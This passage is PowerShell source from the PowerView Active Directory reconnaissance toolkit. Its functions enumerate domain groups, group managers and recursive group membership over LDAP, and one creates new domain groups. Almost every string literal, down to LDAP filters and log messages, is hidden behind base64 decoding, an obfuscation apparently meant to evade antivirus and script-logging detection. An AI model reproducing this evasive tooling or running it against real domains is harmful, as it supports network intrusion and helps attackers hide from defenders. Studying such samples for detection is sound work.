                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                    }
                    elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
                            $GroupName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUp")))
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $GroupDomain
                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKQ==")))
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
                }

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))]) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBhZG1pbkNvdW50PTE=")))
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTY29wZQ==")))]) {
                    $GroupScopeValue = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTY29wZQ==")))]
                    $Filter = Switch ($GroupScopeValue) {
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluTG9jYWw=")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00KQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90RG9tYWluTG9jYWw=")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQpKQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2xvYmFs")))            { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90R2xvYmFs")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpKQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5pdmVyc2Fs")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04KQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90VW5pdmVyc2Fs")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgpKQ=="))) }
                    }
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBncm91cCBzY29wZSAnJEdyb3VwU2NvcGVWYWx1ZQ==")))
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQcm9wZXJ0eQ==")))]) {
                    $GroupPropertyValue = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQcm9wZXJ0eQ==")))]
                    $Filter = Switch ($GroupPropertyValue) {
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHk=")))              { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzdHJpYnV0aW9u")))          { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpKQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlZEJ5U3lzdGVt")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xKQ=="))) }
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90Q3JlYXRlZEJ5U3lzdGVt")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEpKQ=="))) }
                    }
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBncm91cCBwcm9wZXJ0eSAnJEdyb3VwUHJvcGVydHlWYWx1ZQ==")))
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
                }

                $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcik=")))
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogezB9"))) -f $($GroupSearcher.filter))

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                        
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vw"))))
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdA==")))
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))]) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzcGxheU5hbWU=")))]) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))]) {
            $Group.Description = $Description
        }

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gQXR0ZW1wdGluZyB0byBjcmVhdGUgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZQ==")))
        try {
            $Null = $Group.Save()
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gR3JvdXAgJyRTYW1BY2NvdW50TmFtZScgc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQ=")))
            $Group
        }
        catch {
            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Hcm91cF0gRXJyb3IgY3JlYXRpbmcgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZScgOiB7MH0="))) -f $_)
        }
    }
}


function Get-DomainManagedSecurityGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYobWFuYWdlZEJ5PSopKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KSk=")))
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZE5hbWUsbWFuYWdlZEJ5LHNhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1l")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsbmFtZSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZSxvYmplY3RzaWQ=")))
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $_.managedBy
            $Null = $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))))

            
            
            $GroupManager = Get-DomainObject @SearcherArguments
            
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlck5hbWU="))) $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlckRpc3Rpbmd1aXNoZWROYW1l"))) $GroupManager.distinguishedName

            
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlclR5cGU="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlclR5cGU="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))
            }

            $ACLArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $_.distinguishedname
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

            
            
            
            
            
            
            
            
            
            
            

            $ManagedGroup | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFuYWdlckNhbldyaXRl"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))

            $ManagedGroup.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lk1hbmFnZWRTZWN1cml0eUdyb3Vw"))))
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bWVtYmVyLHNhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1l")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjdXJzZVVzaW5nTWF0Y2hpbmdSdWxl")))]) {
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5OiAkSWRlbnRpdHk=")))
                }
                else {
                    $GroupFoundName = $Group.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU="))))[0]
                    $GroupFoundDN = $Group.properties.item(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU="))))[0]

                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        }
                    }
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgTERBUCBtYXRjaGluZyBydWxlIHRvIHJlY3Vyc2Ugb24gJyRHcm91cEZvdW5kRE4nLCBvbmx5IHVzZXIgYWNjb3VudHMgd2lsbCBiZSByZXR1cm5lZC4=")))
                    $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShtZW1iZXJvZjoxLjIuODQwLjExMzU1Ni4xLjQuMTk0MTo9JEdyb3VwRm91bmRETikp")))
                    $GroupSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZE5hbWU=")))))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
